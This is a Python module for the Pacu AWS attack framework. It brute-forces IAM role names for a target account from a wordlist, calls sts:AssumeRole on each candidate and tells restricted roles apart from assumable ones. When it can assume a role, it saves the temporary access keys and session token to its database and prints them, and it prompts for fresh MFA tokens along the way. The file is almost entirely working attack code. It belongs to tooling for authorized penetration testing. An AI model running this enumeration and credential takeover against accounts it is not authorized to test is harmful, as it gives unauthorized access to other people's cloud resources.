#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError
import datetime
import random
import string
import json
import boto3
from core.models import AWSKey



module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'brute_assume',

    # Name and any other notes about the author
    'author': 'netscylla <wolverine@netscylla.com>',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'recon_enum_with_keys',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Attempt bruteforce of assume roles',

    # Full description about what the module does and how it works
    'description': 'Bruteforce assume roles',

    # A list of AWS services that the module utilizes during its execution
    'services': ['IAM'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': [],

    # External resources that the module depends on. Valid options are either a GitHub URL (must end in .git) or single file URL.
    'external_dependencies': [],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': [],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument(
    '--account_id',
    required=True,
    default=None,
    help='One account ID.'
)

parser.add_argument(
    '--serial',
    required=False,
    default=None,
    help='One serial number/account arn.'
)

parser.add_argument(
    '--mfa_token',
    required=False,
    default=None,
    help='One mfa token.'
)

def main(args, pacu_main, key_alias=None):
    session = pacu_main.get_active_session()
    args = parser.parse_args(args)
    account_id=args.account_id
    serialnumber=args.serial
    mfa_token=args.mfa_token

    attempts = 0
    restricted_roles = []
    successful_role_arn = ''

    #if args.word_list is None:
    #    word_list_path = './wordlist.txt'
    #else:
    #    word_list_path = args.word_list.strip()

    with open('./modules/brute_assume/wordlist.txt', 'r') as f:
        word_list = f.read().splitlines()

    client = boto3.client('sts')

    print('Targeting account ID: {}\n'.format(account_id))

    for word in word_list:
        role_arn='arn:aws:iam::{}:role/{}'.format(account_id, word)
        session_name=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(20))
        duration=43200
        attempts += 1

        try:
            if mfa_token is None:
                response = client.assume_role(
                    RoleArn=role_arn,
                    RoleSessionName=session_name,
                    DurationSeconds=duration
                )
            else:
                response = client.assume_role(
                    RoleArn=role_arn,
                    RoleSessionName=session_name,
                    DurationSeconds=duration,
                    SerialNumber=serialnumber,
                    TokenCode=mfa_token
                )
            session.access_key_id=(response['Credentials']['AccessKeyId'])
            session.secret_access_key=(response['Credentials']['SecretAccessKey'])
            session.session_token=(response['Credentials']['SessionToken'])
            aws_key = session.get_active_aws_key(pacu_main.database)
            aws_key = AWSKey(
                session=session,
                user_arn=serialnumber,
                roles=role_arn,
                account_id=account_id,
                key_alias=session_name,
                access_key_id=session.access_key_id,
                secret_access_key=session.secret_access_key,
                session_token=session.session_token
            )
            pacu_main.database.add(aws_key)
            pacu_main.database.add(session)
            pacu_main.database.commit()

            print('  Successfully assumed role: {}'.format(role_arn))
            print('  Session key: {}\n'.format(session_name))

            successful_role_arn = role_arn
            response.pop('ResponseMetadata', None)
            print(json.dumps(response, indent=2, default=str))

            break
        except Exception as error:
            if 'The requested DurationSeconds exceeds the MaxSessionDuration set for this role.' in str(error):
                # Found a vulnerable role, but requested more time than the max allowed for it
                print('  ** Found vulnerable role: {} **'.format(role_arn))
                print('    Hit max session time limit, reverting to minimum of 1 hour...\n')

                if mfa_token is None:
                    response = client.assume_role(
                        RoleArn=role_arn,
                        RoleSessionName=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(20)),
                        DurationSeconds=3600
                    )
                else:
                    mfa_token = input(f'MFA token [Exploit requires a fresh token]: ')
                    response = client.assume_role(
                        RoleArn=role_arn,
                        RoleSessionName=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(20)),
                        DurationSeconds=3600,
                        SerialNumber=serialnumber,
                        TokenCode=mfa_token
                    )

                session.access_key_id=(response['Credentials']['AccessKeyId'])
                session.secret_access_key=(response['Credentials']['SecretAccessKey'])
                session.session_token=(response['Credentials']['SessionToken'])
                aws_key = session.get_active_aws_key(pacu_main.database)
                aws_key = AWSKey(
                    session=session,
                    user_arn=serialnumber,
                    roles=role_arn,
                    account_id=account_id,
                    key_alias=session_name,
                    access_key_id=session.access_key_id,
                    secret_access_key=session.secret_access_key,
                    session_token=session.session_token
                )
                pacu_main.database.add(aws_key)
                pacu_main.database.add(session)
                pacu_main.database.commit()

                print('  Successfully assumed role: {}'.format(role_arn))
                print('  Session key: {}\n'.format(session_name))

                successful_role_arn = role_arn
                response.pop('ResponseMetadata', None)
                print(json.dumps(response, indent=2, default=str))

                break
            elif 'Not authorized to perform sts:AssumeRole' in str(error):
                # Role not found
                pass
            elif 'is not authorized to perform: sts:AssumeRole on resource' in str(error):
                # Role found, but not allowed to assume
                print('  Found restricted role: {}\n'.format(role_arn))
                restricted_roles.append(role_arn)
            elif 'failed with invalid MFA one time pass code' in str(error):
                mfa_token = input(f'MFA token [Exploit requires a fresh token]: ')
            else:
                print(error)
    if len(restricted_roles) == 0 and successful_role_arn == '':
        print('No roles were found.\n')
    elif successful_role_arn == '':
        print('No roles that we can assume were found.\n')
    if len(restricted_roles) > 0:
        print('Found {} restricted role(s):\n'.format(len(restricted_roles)))
        for role in restricted_roles:
            print('    {}'.format(role))



    print('\n{} completed after {} guess(es).\n'.format(account_id, attempts))
